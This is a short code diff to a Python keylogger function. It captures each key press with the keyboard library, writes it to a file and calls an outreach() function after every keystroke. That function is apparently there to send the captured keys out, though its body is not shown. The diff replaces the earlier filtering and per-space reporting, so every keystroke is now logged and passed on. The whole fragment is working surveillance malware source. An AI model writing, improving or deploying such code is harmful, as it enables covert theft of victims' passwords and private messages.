@@ -36,20 +36,9 @@ def keylogger():
 
         if event.event_type == keyboard.KEY_DOWN:
             char = keyboard.read_key()
-            for i in allchars:
-                if char == i:
-                    file.write(char)
-            
 
-            if event.name == 'space':
-                char = '\n'
-                outreach()
-
-
-            elif event.name == 'enter':
-                char = '\n'
-                outreach()
-
+            file.write(char)
+            outreach()
             file.close()
 
 if __name__ == '__main__':
